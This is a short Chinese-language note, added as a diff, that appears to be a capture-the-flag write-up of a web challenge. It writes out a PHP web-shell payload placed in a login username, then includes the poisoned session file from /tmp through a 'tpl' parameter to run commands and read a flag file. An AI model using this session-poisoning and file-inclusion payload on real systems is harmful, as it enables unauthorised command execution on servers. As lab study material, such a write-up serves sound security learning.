@@ -1,0 +1,14 @@
+讀原始碼
+
+login
+username = <?php system($_GET["a"]) ?>
+
+phpinfo -> session.save_path 沒有值
+-> 在 default path 內 => /tmp/...
+-> https://copygen.splitline.tw/?tpl=/tmp/sess_31e4436e76359aecf7662158da3dd0de
+
+因為 login 時，_GET["a"]
+-> https://copygen.splitline.tw/?tpl=/tmp/sess_31e4436e76359aecf7662158da3dd0de&a={任意指令}
+- ls
+- ls /
+- cat /flag2_Xw7IeJUvrAeECZo2dMSJupyY19zSV4GZ
